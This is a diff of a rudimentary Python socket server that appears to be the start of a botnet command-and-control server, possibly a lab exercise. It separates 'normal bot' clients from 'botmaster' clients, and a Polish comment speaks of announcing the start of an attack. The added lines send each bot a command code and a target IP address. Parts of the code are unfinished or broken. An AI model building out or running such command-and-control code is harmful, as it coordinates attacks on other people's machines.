@@ -1,10 +1,10 @@
 # This is a sample Python script.
 import socket
+import time
 from _thread import *
 import threading
 
 from threading import Thread
-
 
 # Press Shift+F10 to execute it or replace it with your code.
 # Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
@@ -14,9 +14,8 @@ from threading import Thread
 # wysłać komunikat o rozpoczęciu ataku
 
 
-
-
 print_lock = threading.Lock()
+
 
 def thread_for_botmaster(c):
     print('Botmaster Connected')
@@ -28,23 +27,27 @@ def threaded(c, addr):
         # data received from client
 
         c.send('11'.encode())
-        # if not data:
-        #     print('Bye')
+        time.sleep(0.5)
+        c.send('192.168.100.8'.encode())
         #
-        #     # lock released on exit
-        #     print_lock.release()
-        #     break
 
         # reverse the given string from client
-        data = c.recv(1024)
-        print('data' + repr(data))
-        data = data[::-1]
+        # data = c.recv(1024)
+        # print('data' + repr(data))
+        # data = data[::-1]
 
         # send back reversed string to client
-        c.send(data)
+        #c.send(data)
 
         # connection closed
-        c.close()
+        if not data:
+            print('Bye')
+
+            # lock released on exit
+            print_lock.release()
+            break
+    c.close()
+
 
 
 # Press the green button in the gutter to run the script.
@@ -71,6 +74,12 @@ if __name__ == '__main__':
     while True:
         # establish connection with client
         c, addr = s.accept()
+        data = c.recv(1024)
+        if int(data.decode())==1:
+            print('normal bot connected')
+        if int(data.decode())==2:
+            print('botmaster connected')
+            #start thread for botmaster
 
         # lock acquired by client
         print_lock.acquire()
